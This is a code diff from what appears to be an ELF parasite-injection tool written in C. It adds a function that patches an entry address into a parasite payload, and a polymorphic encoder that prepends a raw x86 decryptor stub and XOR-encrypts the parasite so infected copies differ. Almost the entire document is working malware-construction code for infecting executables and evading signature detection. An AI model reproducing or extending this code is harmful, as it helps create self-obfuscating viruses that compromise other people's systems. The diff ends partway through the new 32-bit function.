@@ -3,6 +3,42 @@
 #define X86_64_POLYKEY_IND (14 + 8)
 #define X86_64_SIZE_IND    (25 + 8)
 
+#define X86_POLYKEY_IND 12
+#define X86_SIZE_IND 23
+
+int patch_parasite32(Elfit_t *parasite, uint32_t patchpos, uint32_t vaddr)
+{
+    int i;
+
+    if (patchpos==0)
+    {
+        printf("[+ USING SMART PATCHING]\n");
+        for (i=0;i<parasite->file->st_size;i++)
+        {
+            if (!strcmp(&parasite->mem[i], "\x33\x22\x11"))
+            {
+                patchpos = i;
+                break;
+            }
+        }
+    }
+
+    if (patchpos==0)
+    {
+	printf("[- SMART PATCHING PATTERN NOT FOUND]\n");	
+	printf("[! DECIDED NOT TO PATCH]\n");
+	return 0;
+    }
+    else
+    	printf("[+ PATCHING POSITION %d IN PARASITE]\n", patchpos);
+
+    if (patchpos >= parasite->file->st_size)
+        return -1;
+    *(uint32_t *)&parasite->mem[patchpos] = vaddr;
+
+    return 0;
+}
+
 int patch_parasite64(Elfit_t *parasite, uint32_t patchpos, uint64_t vaddr)
 {
     int i;
@@ -20,7 +56,14 @@ int patch_parasite64(Elfit_t *parasite, uint32_t patchpos, uint64_t vaddr)
         }
     }
 
-    printf("[+ PATCHING POSITION %d IN PARASITE]\n", patchpos);
+    if (patchpos == 0)
+    {
+	printf("[- SMART PATCHING PATTERN NOT FOUND]\n");	
+	printf("[! DECIDED NOT TO PATCH]\n");
+	return 0;
+    }
+    else
+    	printf("[+ PATCHING POSITION %d IN PARASITE]\n", patchpos);
 
     if (patchpos >= parasite->file->st_size)
         return -1;
@@ -66,6 +109,44 @@ int parasite_polymorphize64(Elfit_t *parasite, char key)
     /* modify polymorphic parameters */
     *(uint32_t *)&newmem[X86_64_POLYKEY_IND] = key;
     *(uint32_t *)&newmem[X86_64_SIZE_IND] = parasite->file->st_size;
+
+    memcpy(&newmem[preamble_len], parasite->mem, parasite->file->st_size);
+
+    /* now xor encrypt the origin machine code */
+    for (i=0;i<parasite->file->st_size;i++)
+        newmem[preamble_len+i] ^= key;
+
+    /* debug */
+    parasite->file->st_size += preamble_len;
+
+    free(parasite->mem);
+    parasite->mem = newmem;
+}
+
+int parasite_polymorphize32(Elfit_t *parasite, char key)
+{
+    unsigned char preamble[] = {
+	0x60, 0xeb, 0x02, 0xeb, 0x10, 0x31, 0xc0, 0x31, 0xff, 0x31, 0xf6, 0xb8,
+  	0x00, 0x00, 0x00, 0x00, 0xe8, 0xee, 0xff, 0xff, 0xff, 0x5b, 0xbe, 0x00,
+  	0x00, 0x00, 0x00, 0x83, 0xc3, 0x12, 0x31, 0x04, 0x3b, 0x47, 0x39, 0xf7,
+  	0x7c, 0xf8, 0x61
+    };
+    unsigned int preamble_len = 39;
+
+
+    int i;
+    char *newmem;
+
+    newmem = malloc(preamble_len + parasite->file->st_size);
+    if (newmem==NULL)
+    {
+        perror("allocating space for polymorphic preamble\n");
+    }
+    memcpy(newmem, preamble, preamble_len);
+
+    /* modify polymorphic parameters */
+    *(uint32_t *)&newmem[X86_POLYKEY_IND] = key;
+    *(uint32_t *)&newmem[X86_SIZE_IND] = parasite->file->st_size;
 
     memcpy(&newmem[preamble_len], parasite->mem, parasite->file->st_size);
 
